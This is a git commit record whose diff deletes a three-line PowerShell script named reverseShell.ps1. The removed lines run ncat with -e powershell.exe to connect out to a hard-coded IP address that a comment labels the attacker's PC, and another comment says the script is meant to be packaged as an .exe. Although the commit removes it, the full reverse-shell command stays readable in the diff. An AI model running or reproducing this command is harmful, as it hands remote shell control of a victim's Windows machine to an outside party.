e31aef4400dba9bfae07f5e1c10c38eb1862ee09
silvucani <51924916+silvucani@users.noreply.github.com>
2023-09-04 19:13:37 +0200

    Delete reverseShell.ps1

--- reverseShell.ps1
+++
@@ -1,3 +0,0 @@
-#This script has to be converted to .exe file
-Set-Location 'C:\Users\Public\Documents\nmap\nmap-7.92' #Go to netcat directory
-./ncat 217.160.43.125 87 -e powershell.exe #Connect to attcker PC
